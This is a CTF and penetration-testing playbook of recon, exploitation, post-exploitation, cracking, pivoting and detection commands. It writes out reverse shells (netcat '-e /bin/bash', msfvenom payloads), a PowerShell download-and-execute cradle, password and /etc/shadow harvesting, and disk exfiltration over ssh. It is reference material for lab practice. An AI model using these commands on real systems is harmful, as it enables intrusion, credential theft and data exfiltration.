---
title: Yet Another CTF Playbook
subtitle: Version 2
author:
    - christalib
date: June/October 2020
titlepage: true
titlepage-color: 3b9cff
urlcolor: #ee3e37
titlepage-rule-color: 370000
titlepage-text-color: 000000
table-of-contents: true
toc-depth: 4
number-sections: true
toc-title: "Table of Contents"
---

# Reconnaissance

## Nmap

Quickstart:

```sh
nmap -sC -sV --top-ports 20 <IP> -o <FILE>
nmap -sC -sV --open --reason <IP> -o <FILE>
```

Full ports scan:

```sh
nmap -sV -sC -p- -O --open <IP> -o <FILE>
```

Ping sweep:

```sh
nmap -sn -PE <IP or Range>
```

UDP scan:

```sh
nmap -sU <IP or Range>
```

Scan for open ports, determine open services:

```sh
nmap --open -sV <IP or Range>
```

Scan and run default scripts:

```sh
nmap -sC <IP or Range>
```

Run a specific script:

```sh
# location on Kali: /usr/share/nmap/scripts/
nmap --script <SCRIPT_NAME> <IP>
```

Skip ping:

```sh
nmap -Pn <IP>
```

Output result to file:

```sh
nmap <IP> -o <FILE> # text file
nmap <IP> -oG <FiLE> # greppable file
nmap <IP> -oN <FILE> # nmap file
nmap <IP> -oA <FILE> # all formats
```


## Powershell

```powershell
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("<IP>", $_)) "Port
$_ is open!"} 2>$null
```

### Analysing results

#### Port 21 open

* connect with `ftp IP`
* check for `anonymous:anonymous` login
* check the ftp version and nmap has a couple of quick-win scripts:

```sh
nmap --script ftp-anon <IP>
nmap --script ftp-vsftpd-backdoor <IP>
nmap --script ftp-vuln-cve2010-4221 <IP>
```

#### Port 22 open

* possible default credentials, try a small `hydra` bruteforce:
```sh
hydra -L users.txt -P pass.txt IP ssh
```
Other wordlists to try out: `/usr/share/wordlists/wfuzz/others/common_pass.txt`

Think about creating a wordlist from the target website for example.

* **Post-exploitation**:

* possible writable `~/.ssh/authorized_keys`.
* weak crypto: [https://github.com/Ganapati/RsaCtfTool](https://github.com/Ganapati/RsaCtfTool)
* predictable key: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

[Go to Post-Exploitation](#post-exploitation)

#### Port 25 open

You may be able to enumerate usernames through SMTP.

```sh
nc <IP> 25
[...]
VRFY root
252 2.0.0 root
VRFY idontexist
550 5.1.1 <idontexist>: Recipient address rejected: User unknown in local recipient table
```

Or the lazy way, use `smtp-user-enum`:

```sh
smtp-user-enum -M VRFY -u root -t <IP>
```

#### Port 53 open

* add the IP and a domain name to your `/etc/hosts` files
* try a zone transfer:

```sh
host -l <DOMAIN> <IP>
dig axfr @SRHOST <DOMAIN>
dnsrecon -d <DOMAIN>
```

* enumerate subdomains:

```sh
amass enum --passive -d <DOMAIN>
sublist3r -d <DOMAIN> -t 3 -e bing
```

#### Port 80 open

* Web-service running, use `dirb`, `nikto` or `gobuster` to get the most information as possible.

*Examples*:

* `dirb http://IP -r`
* `gobuster dir -w DICT -t 30 -x php,txt,js,html,css` You can use `-f` to try folders instead of files
* if you plan to bruteforce, try generate wordlist with `CeWL`
* if it's a Wordpress instance look into `wpscan`
* sometimes an open FTP is also a feature from a running IIS instance which comes with a CalDav instance. Try it out with `davtest` and exploit with `cadaver`

**Reverse proxy misconfiguration**:

* Sometimes, servers have a misconfiured reverse proxy. Thus, you
need to add the hostnames that resolve to your target IP to your `/etc/hosts`
file:
```sh
<IP> <HOSTNAME>
```

**Common exploits**:

* XSS
* SQLi (l'`UNION` fait la force!)
* Directory Traversal ([Path traversal list windows](https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/) and [path traversal list linux](https://gracefulsecurity.com/path-traversal-cheat-sheet-linux/))
* Default credentials (admin:admin, root:root... Check also the name of the service or the default password for the running application.)
* if CGI-bin, check for Shellshock (TODO)
* If GraphQL, this query describes the whole schema:

```graphql
"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"
```

[Go to Exploitation](#exploitation)

*Other things*:

```sh
sslscan <IP>
```

Website cloner:

```sh
wget -r -nH $URL
```

#### Port 88

In case you have a Kerberos instance, you can try to numerate the users with:

```sh
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <IP>
```

There is also the possibility to use Impacket's [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) script to find all the users that do not require pre-authentification.

There another tool, [kerbrute](https://github.com/ropnop/kerbrute) with which
you can do basically the same stuff than above and a little more.

#### Port 443 open

* if the server only accepts localhost (you get that through the SSL certificate
  details), you will need to tunnel your connection through a user (needs already a first access to the server)

**Common exploits**:

* [Heartbleed](https://gist.github.com/10174134.git)

#### Port 111, 139, 445 open

Check for Samba, Netbios or NFS shares.

* Netbios

Basic scan:

```sh
nbtscan <IP>
nbtscan -O <FILE> <IP>
# generate an HTTP header
nbtscan -H
# Turns off this inverse name lookup, for hanging resolution
nbtscan -n
# PORT target(s) - This allows specification of a UDP port number to be used as the source in sending a query
nbtscan -p
```

* SMB

Check up smb4k

List services available:

```sh
smbclient -L <IP>\C$
smbmap -H <IP>
```

List permissions:

```sh
smbclient -H <IP>
```

List content:

```sh
smbmap -R -H <IP>
```

Basic connection:

```sh
smbclient \\<IP>\<PATH> -U <USER> -P <PASSWORD>
# Anonymous connection
smbclient \\<IP>\<PATH> -N
```


Get all files from remote:

```sh
smbclient //<IP>/<PATH> -c "prompt OFF; recurse ON; cd '\<PATH>\'; lcd
'<LOCAL_PATH>'; mget *"
```

**Common exploits**:

* Login with no password
* ETERNALBLUE: Spawn a reverse shell and use Helviojunior's [script](https://github.com/helviojunior/MS17-010), `send_and_execute.py`to send payload


* Existing NFS mount

* Mount the file system on your computer:

```sh
nmap -sV --script=nfs-showmount <target>
mkdir temp
mount -o nolock IP:/ $PWD/temp
mount -o rw,vers=2 <target>:<share> <local_directory>
# Mount Windows CIFS / SMB share on Linux at /mnt/cifs if you remove password it will prompt on the CLI (more secure as it wont end up in bash_history)
mount -t cifs -o username=user,password=pass,domain=<DOMAIN> //<IP>/share-name /mnt/cifs
# Mount a Windows share on Windows from the command line
net use Z: \win-server\share password /user:domain\janedoe /savecred /p:no
# add a user if you can
groupadd --gid 1337 pwn
useradd --uid 1337 -g pwn pwn
```

* Some RPC stuff

```sh
nmap -sV -p 111 --script rpcinfo <IP>
```

#### Port 161 (UDP)

```sh
sudo nmap -sU -sV -sC --open -p 161 <IP>
# get something out of that
snmp-check <IP>
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP>
snmpwalk -v1 -c public <IP>
# Enmerate users from SNMP
python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP <IP>
```


#### Existing databases

**MsSQL**:

```sh
sqsh -S <IP> -U <USER> -P <PASSWORD>
# known elevation technique for MsSQL
xp_cmdshell 'whoami';
go
```

**MongoDB**:

```sh
mongo -u <USER> -p <PASSWORD> <HOST:PORT/DB>
# get mongo shell
> db
> show collections
> db.task.find()
> db.task.insert(<EXPLOIT>)
```

**MSQL**:

Load external file into db:

```sql
load data infile '/etc/passwd/'
# load data local infile "../index.php"
into table test
fields terminated by "/n"
```

Disable security in the configuration: `secure-file-priv = ""` and enable local files if necessary: `SET GLOBAL local_infile=1;`


#### Port 5985

If this port is open, it's possible there is an instance of Windows Remove
Management system. You can use
[EvilRM](https://github.com/Hackplayers/evil-winrm) to connect to the target
after you got credentials.

[Go to Post-Exploitation](#post-exploitation)

#### Port 8080

By default, Tomcat can run on port 8080. If this is the case, there are a couple
of exploitation you might look into:

* bruteforce:

You can find this script in the subfolder scripts in this repo.

```sh
ruby tomcat-brute.rb -w tomcat-betterdefaultpasslist.txt -H 10.10.10.95 -P 8080
```

[Hackingarticles.in](https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/) has listed a couple of other techniques (some of them are modules in Metasploit):

* Tomcat Manager Authenticated Upload Code Execution
* Tomcat War Deployer Script

If you have access to the manager and can upload a file, you can use this
webshell: [https://raw.githubusercontent.com/tennc/webshell/master/jsp/jspbrowser/Browser.jsp](https://raw.githubusercontent.com/tennc/webshell/master/jsp/jspbrowser/Browser.jsp)

## NSLookup

Basic lookup:

```sh
nslookup server <IP>
```

## Host

Basic usage:

```sh
host <IP>
```

Zone transfert:

```sh
host -l <DOMAIN> <IP>
```

## Automation

```sh
enum4linux -a <IP>
```

# Exploitation

## Bruteforcing

Check [hacktricks](https://book.hacktricks.xyz/brute-force) for tips and commands.

## Searchsploit

Basic usage:

```sh
searchsploit <KEYWORDS>
```

Copy path to clipboard:

```sh
searchsploit -p <ID>
```

Copy to current folder:

```sh
searchsploit -m <ID>
```

Get online link instead of local paths:

```sh
searchsploit -w <KEYWORDS>
```

## Shells

### Netcat

Basic bind shell:
```sh
nc -nvlp 443           # On local Kali
nc -nv <REMOTE-IP> 443 # On remote
```

Basic reverse shell:

```sh
sudo nc -nlvp 443                  # On local Kali
nc -nv <LOCAL-IP> 443 -e cmd.exe   # On remote Windows
nc -nv <LOCAL-IP> 443 -e /bin/bash # On remote Linux
```
Sending files:

```sh
sudo nc -nvlp 443 > incoming.exe     # Reciever
nc -nv <LOCAL-IP> 443 < incoming.exe # Sender
```

## MSFVenom shells:

### Linux

Linux Meterpreter reverse shell x86 multi stage:

```sh
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```

Linux Meterpreter bind shell x86 multi stage:

```sh
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```

Linux bind shell x64 single stage:

```sh
msfvenom -p linux/x64/shell_bind_tcp RHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```

Linux reverse shell x64 single stage:

```sh
msfvenom -p linux/x64/shell_reverse_tcp RHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```

### Windows

Windows Meterpreter http reverse shell:

```sh
msfvenom -p windows/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe
```

Windows Meterpreter bind shell:

```sh
msfvenom -p windows/meterpreter/bind_tcp RHOST=<IP> LPORT=<PORT> -f exe > shell.exe
```

Windows CMD Multi Stage:

```sh
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
```

Windows CMD Single Stage:

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
```

Windows add user:

```sh
msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
```

Windows shell which doesn't break the application for a x86 architecture:

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f exe -a x86 --platform windows -o sploit.exe
```


Windows Exec Nishang Powershell in python

```sh
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f python
```

Bad characters shikata_ga_nai:

```sh
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=<IP> LPORT=<PORT> -f c -e x86/shikata_ga_nai -b "\x04\xA0"
```

Bad characters fnstenv_mov:

```sh
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=<IP> LPORT=<PORT> -f c -e x86/fnstenv_mov -b "\x04\xA0"
```

### Misc

Python Shell:

```sh
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py
```

Bash Shell:

```sh
msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh
```

Perl Shell:

```sh
msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl
```

ASP Meterpreter Shell:

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
```

PHP Reverse Shell:

```sh
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > phpreverseshell.php
```

To get multiple session on a single multi/handler, you need to set the
ExitOnSession option to false and run the exploit -j instead of just the
exploit. For example, for meterpreter/reverse_tcp payload:

```
msf>use exploit/multi/handler
msf>set payload windows/meterpreter/reverse_tcp
msf>set lhost <IP>
msf>set lport <PORT>
msf> set ExitOnSession false
msf>exploit -j
```

## Webshells

* PentestMonkey PHP [webshell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
* Kali's Webshells: `locate webshells`

## cURL

Upload file:

```sh
curl <IP> --upload-file <FILE>
```

Query as a bot:

```sh
curl -A "'Mozilla/5.0 (compatible;Googlebot/2.1; +http://www.google.com/bot.html)')" <IP>
```

Give parameters with encoding:

```sh
curl <IP> --data-urlencode urlConfig=<PATH>
```

Send request as logged user:

```sh
curl -u <USER> <IP> --data-binary <PAYLOAD>
```

### Common Options ([Source](https://gist.github.com/subfuzion/08c5d85437d5d4f00e58))

`-#, --progress-bar`
        Make curl display a simple progress bar instead of the more informational standard meter.

`-b, --cookie <name=data>`
        Supply cookie with request. If no `=`, then specifies the cookie file to use (see `-c`).

`-c, --cookie-jar <file name>`
        File to save response cookies to.

`-d, --data <data>`
        Send specified data in POST request. Details provided below.

`-f, --fail`
        Fail silently (don't output HTML error form if returned).

`-F, --form <name=content>`
        Submit form data.

`-H, --header <header>`
        Headers to supply with request.

`-i, --include`
        Include HTTP headers in the output.

`-I, --head`
        Fetch headers only.

`-k, --insecure`
        Allow insecure connections to succeed.

`-L, --location`
        Follow redirects.

`-o, --output <file>`
        Write output to <file>. Can use `--create-dirs` in conjunction with this to create any directories
        specified in the `-o` path.

`-O, --remote-name`
        Write output to file named like the remote file (only writes to current directory).

`-s, --silent`
        Silent (quiet) mode. Use with `-S` to force it to show errors.

`-v, --verbose`
        Provide more information (useful for debugging).

`-w, --write-out <format>`
        Make curl display information on stdout after a completed transfer. See man page for more details on
        available variables. Convenient way to force curl to append a newline to output: `-w "\n"` (can add
        to `~/.curlrc`).

`-X, --request`
        The request method to use.


### POST

When sending data via a POST or PUT request, two common formats (specified via the `Content-Type` header) are:

  * `application/json`
  * `application/x-www-form-urlencoded`

Many APIs will accept both formats, so if you're using `curl` at the command line, it can be a bit easier to use the form urlencoded format instead of json because

  * the json format requires a bunch of extra quoting
  * curl will send form urlencoded by default, so for json the `Content-Type` header must be explicitly set

This gist provides examples for using both formats, including how to use sample data files in either format with your `curl` requests.

### curl usage

For sending data with POST and PUT requests, these are common `curl` options:

 * request type
   * `-X POST`
   * `-X PUT`

 * content type header
  * `-H "Content-Type: application/x-www-form-urlencoded"`
  * `-H "Content-Type: application/json"`

* data
  * form urlencoded: `-d "param1=value1&param2=value2"` or `-d @data.txt`
  * json: `-d '{"key1":"value1", "key2":"value2"}'` or `-d @data.json`

### Examples

#### POST application/x-www-form-urlencoded

`application/x-www-form-urlencoded` is the default:

    curl -d "param1=value1&param2=value2" -X POST http://localhost:3000/data

explicit:

    curl -d "param1=value1&param2=value2" -H "Content-Type: application/x-www-form-urlencoded" -X POST http://localhost:3000/data

with a data file

    curl -d "@data.txt" -X POST http://localhost:3000/data

#### POST application/json

    curl -d '{"key1":"value1", "key2":"value2"}' -H "Content-Type: application/json" -X POST http://localhost:3000/data

with a data file

    curl -d "@data.json" -X POST http://localhost:3000/data


## Powershell

Download remote files:

```powershell
powershell "(New-Object System.Net.WebClient).DownloadFile("<IP+file>",
<Destination-File>)"
```


# Post-Exploitation

## Improve your shell

* `sh -c uname -a; w; id; /bin/bash -i`
* For NMAP versions 2.0 to 5.8:
```sh
nmap --interactive
!sh
```
* `python -c 'import pty; pty.spawn("/bin/bash")'`
* `stty raw -echo` and then `fg` and `export TERM=xterm`

## Local Recon

### Windows

General recon:

```cmd
whoami
hostname
systeminfo
ipconfig /all
netstat
```

Network discovery:

```cmd
C:\> net view /all
C:\> net view \\<Hostname>
C:\> net users
C:\> net users /domain
```

Ping scan:

```cmd
C:\> for \L %I in (1,1,254) do ping -w 30 -n 1 192.168.1.%I | find "Reply" >> output.txt
```

Look for passwords:

```powershell
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
dir /s *pass* == *.config
findstr /si password *.xml *.ini *.txt *.bat *.ps1
# don't forget that this exists
ls -force
```

Specific string search:

```powershell
ls -r C:\PATH -file | {Select-String -path $_ -pattern <SEARCH TERM>}
```

Credentials:

```powershell
# Import credentials from a xml powershell file
$creds = Import-CliXml -Path C:\Users\file.txt
$creds.GetNetworkCredential().Password

# it is also possible to grab the current user's credential with
Get-Credential
# or for a specific user
Get-Credential -credential $user
```

Get-Credential returns an object for which there is a good
[documentation](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-credential?view=powershell-7).
However, it might not run if you are not the user you try to get credential for.


#### Automation

* [WinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
* [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
* [COMahawk](https://github.com/apt69/COMahawk)

JuicyPotato, HotPotato...


### Linux

General recon:

```sh
whoami
hostname
ifconfig
id
uname -a
cat /etc/passwd
cat /etc/shadow
cat /etc/*-release
sudo -l
ps -aux
netstat -tulpn
watch ss -stulp
lsof -i
# show last logged users
last
df -h
# reset pw in one line
echo "user:pass" | chpasswd
# list users
getent passwd
```

Run a command as a user:

```sh
sudo -u <USER>
sudo -i -u <USER>
```

Network discover:

```sh
ifconfig
ip a
```

Ping scan:

```sh
for i in `seq 1 254`; do ping 192.168.1.$i; done
```

#### General find:

* `-L`: follow symbolic links

File types:

* f: a regular file
* d: directory
* l: symbolic link
* c: character devices
* b: block devices
* p: named pipe (FIFO)
* s: socket

Options:

* -amin n: The file was last accessed n minutes ago.
* -anewer: The file was last accessed more recently than it was modified.
* -atime n: The file was last accessed more n days ago.
* -cmin n: The file was last changed n minutes ago.
* -cnewer: The file was last changed more recently than the file was modified.
* -ctime n: The file was last changed more than n days ago.
* -empty: The file is empty.
* -executable: The file is executable.
* -false: Always false.
* -fstype type: The file is on the specified file system.
* -gid n: The file belongs to group with the ID n.
* -group groupname: The file belongs to the named group.
* -ilname pattern: Search for a symbolic line but ignore the case.
* -iname pattern: Search for a file but ignore the case.
* -inum n: Search for a file with the specified node.
* -ipath path: Search for a path but ignore the case.
* -iregex expression: Search for an expression but ignore the case.
* -links n: Search for a file with the specified number of links.
* -lname name: Search for a symbolic link.
* -mmin n: The file data was last modified n minutes ago.
* -mtime n: The file data was last modified n days ago.
* -name name: Search for a file with the specified name.
* -newer name: Search for a file edited more recently than the file given.
* -nogroup: Search for a file with no group id.
* -nouser: Search for a file with no user attached to it.
* -path path: Search for a path.
* -readable: Find files that are readable.
* -regex pattern: Search for files matching a regular expression.
* -type type: Search for a particular type.
* -uid uid: The file numeric user id is the same as the uid.
* -user name: The file is owned by the user that is specified.
* -writable: Search for files that can be written to.

##### Find (by permissions)

Find SUID/SGID files:

```sh
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
find / -perm /u=s
find / -perm /g=s
find / -perm 2644
find / -perm 1551
find . -type f -perm 0777 -print
find / -type f ! -perm 777
```


Find read only files:

```sh
find / -perm /u=r
find / -perm /a=x
```

Find all 777 permission files and use chmod command to set permissions to 644:

```sh
find / -type f -perm 0777 -print -exec chmod 644 {} \;
```

##### Find (and execute)

For example to delete all files ending with .temp from the /var/log/ you would use:

```sh
find /var/log/ -name `*.temp` -delete
```

Find and remove single File:

```sh
find . -type f -name "tecmint.txt" -exec rm -f {} \;
```

Find and remove Multiple File:

```sh
find . -type f -name "*.txt" -exec rm -f {} \;
find . -type f -name "*.mp3" -exec rm -f {} \;
```

Send output from the find command to a file:

```sh
find / -name *.mp3 -fprint nameoffiletoprintto
```

Find and execute a command against a file:

```sh
# Search and edit a file at the same time
find / -name filename -exec nano '{}' \;
```

##### Find (user based)

Find single files based on user:

```sh
find / -user root -name file.txt
```

Find all files based on group:

```sh
find /home -group developer
```

Find Particular Files of User:

```sh
find /home -user tecmint -iname "*.txt"
```

##### Find (time based)

Find last 50 days modified files:

```sh
find / -mtime 50
```

Find last 50 days accessed files:

```sh
find / -atime 50
```

Find Last 50-100 Days Modified Files:

```sh
find / -mtime +50 –mtime -100
```

Find Changed Files in Last 1 Hour:

```sh
find / -mmin -60
```

Find Accessed Files in Last 1 Hour:

```sh
find / -amin -60
```

##### Find (size based)

* b: 512-byte blocks (default)
* c: bytes
* w: two-byte words
* k: Kilobytes
* M: Megabytes
* G: Gigabytes

Find Size between 50MB – 100MB:

```sh
find / -size +50M -size -100M
```

Find and Delete 100MB Files:

```sh
find / -type f -size +100M -exec rm -f {} \;
```

Find Specific Files and Delete:

```sh
find / -type f -name *.mp3 -size +10M -exec rm {} \;
```

Find all emtpy files:

```sh
find /tmp -type f -empty
```

Find all empty directories:

```sh
find /tmp -type d -empty
```

Find all hidden files:

```sh
find /tmp -type f -name ".*"
```

#### Automation

* [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
* [Linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
* [LinEnum](https://github.com/rebootuser/LinEnum)
* MySQL running as root? [`raptor_udf2.c`](https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c)
* [Monitor linux processes without root permissions](https://github.com/DominicBreuker/pspy)

If you are on a modern ubuntu, there is a Privesc vector through the USB creator
program: [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

### Send files to remote hosts

#### Powershell

```powershell
Invoke-Webrequest -Uri <IP> -OutFile <DestFile>

# Win 7
(New-Object System.Net.WebClient).DownloadFile("http://<IP>/nc.exe", "c:\nc.exe")

# Win 8 and later
wget "http://<IP>/nc.exe" -outfile "c:\nc.exe"
```

#### Impacket-smbserver

```sh
impacket-smbserver secure . (-smb2support)
copy \\<IP>\secure\<FILE>
```

## Firewall

```powershell
# Get Firewall rules
Get-NetFirewallRule -all | Out-GridView
Get-NetFirewallRule -all | Export-csv <file.csv>

# Add a Firewall rule
New-NetFirewallRule -Action Allow -DisplayName <NAME> -RemoteAddress <IP>
```

## Pivoting

SSH access always gives you the easiest pivot. You can set up a SOCKS proxy by adding the -D flag as follows.

`ssh $USERNAME@$RHOST -D 1080`

This opens a SOCKS proxy on your machine’s port 1080, which is proxied to the target system. You can configure to use it with proxychains quite easily.

Another nice addition to the proxying portfolio is sshuttle, it does some magic to automatically proxy traffic from your host to a certain subnet through the target system.

`shuttle -r $USERNAME@$RHOST 10.1.1.0/24`

If you only have Windows systems to deal with, Chisel comes highly recommended. It’s a bit more complicated to set up a full SOCKS proxy, as it requires two sessions on the target. The required commands are as below.

On Kali:

```sh
./chisel server -p 8000 --reverse
```

On target:

```sh
.\chisel_windows_386.exe client $LHOST:8000 R:8001:127.0.0.1:9001
```

Now we are listening on localhost:8001 on kali to forward that traffic to target:9001.

Then, open the Socks server: On target:

```sh
.\chisel_windows_386.exe server -p 9001 --socks5
```

On Kali:

```
./chisel client localhost:8001 socks
```


## Port forwarding

If you find a vulnerable service running on the target host, one way to exploit
it would be to forward the port where this service is running towards your
machine and launch the exploit from there.

### Windows

```cmd
plink.exe -ssh -l <USER> -pw <PASSWORD> -R <BIND_IP>:<BIND_PORT>:127.0.0.1:<PORT> <BIND_IP>
```


### Linux

#### SSH tunneling

```sh
# port forward
ssh -N -R <BIND_IP>:<BIND_PORT>:host:hostport <user@address>

# dynamic port forward + add 8888 port to the proxychains conf
ssh -N -D 127.0.0.1:8888 <user@address>

```

## Cracking

Decompress things:

```sh
tar xf archive.tar
tar xvzf archive.tar.gz
tar xjf archive.tar.bz2
tar xtvf file.tar.gz | grep <WORD>
tar -C <DEST> -xvf <FILE>
unzip archive.zip
gzip -d archive.gz

# read a gz file without decompressing
zcat archive.gz
zless archive.gz
zgrep <WORD> /var/log/mailliog*.gz

# Search instide a zip archive
zipgred *.txt archive.zip
```

Compress things:

```sh
zip -r file.zip /dir/*
tar cf archive.tar files
tar czf archive.tar.gz files
tar cjf archive.tar.bz2 files
gzip file
```

### John

```sh
john --wordlist=dict.txt passwd
john --show passwd
john --restore
unshadow passwd shadow > unshadowed.txt
john --wordlist=dict.txt unshadowed.txt
```

### Hashcat

Basic use:

```sh
hashcat -m 0 -a 0 -o <OUTPUT_FILE> <INPUT_FILE> <WORDLIST>

# basic bruteforce attack for MD5
hashcat -a 0 -m 0 hashes.txt dict.txt

# basic bruteforce with combinations for MD5 (this will add the combinations of
hashcat -a 1 -m 0 hashes.txt dict.txt
```

* `-m`: defines the algorithm type ([full list](https://hashcat.net/wiki/doku.php?id=example_hashes))
* `-a`: attack mode (0: straight, 1: combination, 3: brute-force)

### Hydra

```sh
hydra -l user -P passlist.txt ftp://192.168.0.1
hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
hydra -C defaults.txt -6 pop3s://[fe80::2c:31ff:fe12:ac11]:143/TLS:DIGEST-MD5
hydra -L users.txt -P pass.txt <IP> -s <PORT> http-post-form "/users/sign_in:user[email]=^USER^&user[password]=^PASS^&user[Commit]=Log inn:Invalid Email or password.
hydra -P /usr/share/wordlistsnmap.lst <IP> smtp -V
```

### Binwalk

### Steghide

```sh
steghide extract -sf <FILE>
```

### Fcrackzip

Run as dictionnary mode, try to decompress the target:

```sh
fcrackzip -u -D -p <Wordlist> <FILE>
```

### Uncipher stuff

Handy tool for RSA: [RsaCTFTool](https://github.com/Ganapati/RsaCtfTool)

# Exfiltration

Encrypted Exfiltration channel:

*Exfiltrate the contents of an image via SSH to another machine, compressing (-C) the content.*

```sh
dd if=/dev/rdisk0s1s2s bs=65536 conv=noerror,sync | ssh -C user@<IP> "cat >/tmp/image.dd"
```

# Detection

This section cover detection malicious activity on system and could be a good
list of stuff to clean up.

## Linux

List connected users:

```sh
w
who
```

Linux systems keep a trace of the connections. keeping in memory user, IP and
even length of the connection:

```sh
last
```

List connection errors:

```sh
lastb
```

List the recent history the current user:

```sh
history

su otheruser
history
```

Check if there isn't a new user registered:

```sh
cat /etc/passwd
awk -F':' '{ print $1}' /etc/passwd

# list only user using shells
cat /etc/passwd | grep /bin/bash (ou zsh, sh, etc.)

# list available shells on your machine
cat /etc/shells
```

Check processes:

```sh
ps
ps aux
top
lsof -i
lsof -i -p <PID>

# check files open by a process

lsof -l
lsof -p <PID>
```

Check ports:

```sh

# list TCP/UDP open ports

netstat -lntup
ss -lntup

# use routes

netstat -r

# show routes stats

netstat -s
ss -s
```

Check network and routes:

```sh
ip address
ip a
ip route
```

Check running crons:

```sh
crontab -l
crontab -u user -l
ls -la /etc/cron.daily
ls -la /etc/cron.hourly
ls -la /etc/cron.weekly
```

Quick search modified files (check the [General Find](https://github.com/christalib/yaCTFpl/blob/aleph/manual.md#general-find) section for more detail):

Find files modified in the past 5 days:

```sh
find / -mtime -5 -ctime -5
```

Find files modified in the last minute:

```sh
find / -mmin -1
```

General logs:

```sh
cat /var/log/syslog
cat /var/log/syslog | less
tail -f -n 5 /var/log/syslog
cat /var/log/syslog | grep fail
tail -f /var/log/syslog
```

Check SSH keys:

```sh
cat /root/.ssh/authorized_keys
cat /home/debian/.ssh/authorized_keys
cat /home/user1/.ssh/authorized_keys
```

Check /tmp content:

```sh
ls /tmp
ls -la /tmp
ls -la /tmp | more
less /tmp
ls -la /tmp | grep xxx
```

# Reverse

## radare2 suite

([Source](https://www.megabeets.net/a-journey-into-radare-2-part-1/))

Get information about the binary:

```sh
rabin2 -v BIN
```

* by default r2 doesn't analyse the binary, you can do it with `aa` or `aaa`
* (check `aa?` for help and information about the commands) it is also possible to analyse the entire binary straigth away with `r2 -A vuln`
* flags are interesting offset of the binary, such as Sections, Functions, Symbols and Strings, you can list them with `fs` and check some of them with `fs <section>` and use `f` to print the flags it contains ex: `fs imports;f`
* to list all functions: `afl`
* `iz` lists strings in data sections and `izz` search for strings in the whole binary
* `axt` stands for analyse x-refs to
* This command reveals us more of radare2 features. The `axt` command is used to "find data/code references to this address" (see ax?). The special operator @@ is like a foreach iterator sign, used to repeat a command over a list of offsets (see @@?), and `str.*` is a wildcard for all the flags that start with str.. This combination helps us not just to list the strings flags but also to list the function name, where they are used and the referencing instruction. Make sure to select the strings flagspace (default, use `fs *`) before.
* to find a function or go somewhere, you can use `s` (seek). Ex: `s main` (your hex address will change and you will be in the main function)
* to dissassemble: `pdf`. Whole sequence: `s main; pdf`
* radare2 is equipped with a very strong and efficient suite of Visual Modes. The Visual Mode is much more user-friendly and takes the reversing experience using r2 to a whole new level. Pressing V will bring us to the Visual Mode screen. Use p/P to change between modes. At the top of the screen you can see the command which was used to generate the view. Navigate to the disassembly view using p. To go back from a specific screen, press q.
* reopen in debug mode: `ood` and `dc` for debug continue
* `dr` to show register and give: `dr rip` for a specific register
* use x/X to list the references to/from (respectively) the current offset. Use the numbers to jump to a reference.
radare2 commands
* use :command to execute r2 commands from inside Visual Mode. This is similar to VIM.
